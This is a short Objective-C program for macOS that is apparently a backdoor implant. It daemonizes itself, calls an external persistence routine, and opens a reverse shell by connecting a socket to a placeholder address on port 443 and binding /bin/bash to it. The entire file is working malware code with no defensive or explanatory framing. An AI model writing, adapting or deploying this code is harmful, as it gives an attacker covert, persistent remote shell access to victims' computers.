#import <Foundation/Foundation.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <arpa/inet.h>
#import <unistd.h>
#import "persistence.h"

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        // Daemonize
        if (fork() != 0) exit(0);
        setsid();
        install_persistence();
        
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(443);
        inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
        connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
        execl("/bin/bash", "bash", NULL);
    }
    return 0;
}